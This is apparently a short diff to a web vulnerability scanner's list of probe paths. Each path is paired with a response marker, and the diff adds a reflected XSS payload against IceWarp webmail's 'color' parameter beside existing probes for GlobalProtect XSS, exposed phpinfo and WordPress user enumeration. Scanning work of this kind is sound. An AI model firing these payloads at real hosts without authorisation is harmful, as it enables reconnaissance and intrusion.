@@ -2,3 +2,4 @@
 '/global-protect/login.esp?user=%22%3balert(%27xElkomy%27)%2f%2f407'  If Found For My tool => 'GlobalProtect Portal'
 '/phpinfo.php' If Found For my tool => 'PHP Version'
 '/wp-json/wp/v2/users' If Found For my tool => '[{"id"'
+'/webmail/?language=pl&interface=pro&username=&color=%27"><svg/onload=prompt(%27xElkomy%27)//' 'Powered by IceWarp Server ©'
